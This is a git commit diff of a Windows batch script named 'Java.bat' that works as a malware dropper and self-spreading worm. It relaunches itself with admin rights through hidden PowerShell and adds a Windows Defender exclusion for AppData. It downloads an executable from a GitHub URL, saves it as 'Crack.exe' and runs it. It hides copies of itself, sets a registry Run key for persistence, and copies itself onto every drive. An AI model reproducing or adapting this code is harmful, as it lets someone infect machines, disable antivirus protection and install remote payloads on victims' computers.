29458fde4c12e66f887aa76586b047b43e511cad
MrAboudi <94474093+Abdullah67289@users.noreply.github.com>
2025-07-07 09:36:40 -0400

    Update Java.bat

--- Java.bat
+++ Java.bat
@@ -1,10 +1,10 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: ==== Skip if already installed ====
+:: Skip if already installed
 if exist "%USERPROFILE%\AppData\Roaming\SubDir\System32.exe" exit /b
 
-:: ==== Wait for internet ====
+:: Wait for internet
 :CheckInternet
 ping -n 1 8.8.8.8 >nul 2>&1
 if errorlevel 1 (
@@ -12,57 +12,55 @@ if errorlevel 1 (
     goto CheckInternet
 )
 
-:: ==== Run as admin if not ====
+:: Run as admin
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
     exit /b
 )
 
-:: ==== Defender exclusion ====
+:: Defender exclusion
 set "APPDATA_PATH=%USERPROFILE%\AppData"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 
-:: ==== Download and run payload ====
+:: Download and run payload
 set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
 set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
 
-:: ==== Self path & startup path ====
+:: Copy this script to hidden location
 set "SELF=%~f0"
-set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-attrib +h +s "%STARTUP_FOLDER%" >nul 2>&1
+set "HIDEFOLDER=%APPDATA%\Roaming\System"
+set "HIDDEN_BAT=%HIDEFOLDER%\WinCheck.bat"
+mkdir "%HIDEFOLDER%" >nul 2>&1
+copy "%SELF%" "%HIDDEN_BAT%" >nul
+attrib +h +s "%HIDEFOLDER%" >nul
+attrib +h +s "%HIDDEN_BAT%" >nul
 
-:: ==== Loop through drives ====
-for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-    if exist "%%L:\" (
-        set "FOLDER=System %%L"
-        set "DRIVE_FOLDER=%%L:\!FOLDER!"
-        set "DRIVE_BAT=!DRIVE_FOLDER!\Java.bat"
-        set "STARTUP_NAME=Microsoft%%L.bat"
-        set "STARTUP_BAT=%STARTUP_FOLDER%\!STARTUP_NAME!"
+:: Registry startup
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinCheckService" /t REG_SZ /d "\"%HIDDEN_BAT%\"" /f >nul
 
-        :: Create hidden folder on drive
-        mkdir "!DRIVE_FOLDER!" >nul 2>&1
-        if exist "!DRIVE_FOLDER!" (
-            copy "%SELF%" "!DRIVE_BAT!" >nul
-            if exist "!DRIVE_BAT!" (
-                attrib +h +s "!DRIVE_FOLDER!"
-                attrib +h +s "!DRIVE_BAT!"
-            )
-        )
+:: Loop through drives and replicate
+for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do call :COPYDRIVE %%L
 
-        :: Copy renamed version to Startup
-        copy "%SELF%" "!STARTUP_BAT!" >nul
-        if exist "!STARTUP_BAT!" (
-            attrib +h +s "!STARTUP_BAT!"
-        )
+goto :EOF
+
+:COPYDRIVE
+set "DRIVE=%1"
+if exist "%DRIVE%:\" (
+    set "FOLDER=System %DRIVE%"
+    set "DRIVE_FOLDER=%DRIVE%:\%FOLDER%"
+    set "DRIVE_BAT=%DRIVE_FOLDER%\Java.bat"
+
+    mkdir "%DRIVE_FOLDER%" >nul 2>&1
+    copy "%SELF%" "%DRIVE_BAT%" >nul
+    if exist "%DRIVE_BAT%" (
+        attrib +h +s "%DRIVE_FOLDER%"
+        attrib +h +s "%DRIVE_BAT%"
     )
 )
-
-exit
-
+exit /b
 
 :: By MrAboudi
 :: v2
